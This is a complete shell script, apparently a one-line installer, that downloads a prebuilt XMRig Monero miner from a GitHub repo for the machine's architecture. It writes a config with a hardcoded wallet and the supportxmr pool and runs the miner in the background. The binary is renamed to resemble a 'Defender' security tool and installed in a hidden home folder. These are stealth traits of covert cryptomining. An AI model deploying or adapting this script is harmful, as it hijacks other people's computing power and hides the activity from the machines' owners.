#!/bin/sh
# oneline.sh — Installer XMRig multi-arsitektur dari binary hasil build sendiri.
# Sumber binary: repo GitHub pribadi (upload hasil cross-compile dari dist/).
# Verifikasi SHA256 wajib, config langsung keisi, sekali jalan langsung start.
#
# Pakai:  sh oneline.sh
# Env opsional: REPO_USER (username GitHub), REPO_NAME (nama repo),
#               BRANCH (default main), WALLET (default wallet yang sudah keisi),
#               DEFFENDER_DIR (lokasi instalasi, default ~/.deffender)
#
# WORKDIR = ~/.deffender (folder tersembunyi).
# BINARY = deffender.<arch> — nama file di repo lu (x64 / arm64 / armv7).

set -eu

REPO_USER="${REPO_USER:-grayteams}"         # username GitHub
REPO_NAME="${REPO_NAME:-teams}"             # nama repo tempat binary di-host
BRANCH="${BRANCH:-main}"
WALLET="${WALLET:-86CqeAcomozQ67JJGm1cgEWZms56cLogui2hmg5QZr6TVAABiLLv47iYgirYZzz16s9doatnUb4CoRbcBi975sCN3XAXF2A}"
BASE_URL="https://raw.githubusercontent.com/${REPO_USER}/${REPO_NAME}/${BRANCH}"
WORKDIR="${DEFFENDER_DIR:-$HOME/.deffender}"

command -v uname >/dev/null 2>&1 || { echo "[-] uname tidak ditemukan"; exit 1; }
if ! command -v curl >/dev/null 2>&1 && ! command -v wget >/dev/null 2>&1; then
    echo "[-] butuh curl ATAU wget (opkg install curl atau wget)"; exit 1
fi

# --- Helper unduh: pakai curl kalau ada, kalau tidak otomatis pakai wget ------
dl() { # $1=URL, $2=file output
    if command -v curl >/dev/null 2>&1; then
        curl -fsSL -o "$2" "$1" 2>/dev/null || wget -q -O "$2" "$1" 2>/dev/null
    else
        wget -q -O "$2" "$1" 2>/dev/null
    fi
}

# --- Deteksi arsitektur -> nama file binary di repo --------------------------
case "$(uname -m)" in
    x86_64|amd64) BIN="deffender.x64" ;;
    aarch64|arm64) BIN="deffender.arm64" ;;
    armv7l) BIN="deffender.armv7" ;;
    *) echo "[-] Arsitektur tidak didukung: $(uname -m)"; exit 1 ;;
esac

mkdir -p "$WORKDIR"
cd "$WORKDIR" || exit 1

echo "[+] Deteksi arsitektur: $(uname -m) -> ${BIN}"

# --- Unduh binary + SHA256 (ids, sekali udah ada langsung skip) ---------------
if [ ! -f "$BIN" ]; then
    echo "[+] Unduh binary ${BIN}..."
    dl "${BASE_URL}/${BIN}" "$BIN" || { echo "[-] Gagal unduh ${BIN}"; exit 1; }
fi

if [ ! -f "$BIN.sha256" ]; then
    echo "[+] Unduh checksum ${BIN}.sha256..."
    dl "${BASE_URL}/${BIN}.sha256" "$BIN.sha256" || { echo "[-] Gagal unduh checksum"; exit 1; }
fi

# --- Verifikasi SHA256 (wajib) -------------------------------------------------
if command -v sha256sum >/dev/null 2>&1; then
    ( cd "$WORKDIR" && sha256sum -c "$BIN.sha256" ) || { echo "[-] SHA256 GAGAL — binary tidak cocok"; exit 1; }
    echo "[+] SHA256 cocok"
else
    echo "[!] sha256sum tidak ada, skip verifikasi (rekomendasi: verifikasi manual)"
fi

chmod +x "$BIN"

# --- Pastikan biner valid --------------------------------------------------------
if ! ./"$BIN" --version >/dev/null 2>&1; then
    echo "[-] Binary gagal dieksekusi (mungkin arsitektur salah / butuh deps)"; exit 1
fi
echo "[+] Versi: $(./"$BIN" --version | head -1)"

# --- Tulis config.json kalau belum ada (wallet langsung keisi) -------------------
if [ ! -f config.json ]; then
    echo "[+] Buat config.json (wallet: ${WALLET})..."
    cat > config.json <<EOF
{
    "autosave": true,
    "cpu": true,
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "url": "pool.supportxmr.com:443",
            "user": "${WALLET}",
            "pass": "x",
            "keepalive": true,
            "tls": true
        }
    ]
}
EOF
    chmod 600 config.json
fi

# --- Jalanin di background + simpan PID/log --------------------------------------
if [ -f deffender.pid ] && kill -0 "$(cat deffender.pid)" 2>/dev/null; then
    echo "[!] Sudah jalan (PID $(cat deffender.pid)) — stop dulu kalau mau restart."
    exit 0
fi

nohup ./"$BIN" -c config.json "$@" > deffender.log 2>&1 &
PID=$!
echo "$PID" > deffender.pid
sleep 1
if ! kill -0 "$PID" 2>/dev/null; then
    echo "[-] Gagal start — cek deffender.log"; exit 1
fi
echo "[+] Jalan (PID $PID)"
echo "[+] Log: $WORKDIR/deffender.log"
echo "[+] Stop: kill \$(cat $WORKDIR/deffender.pid)"
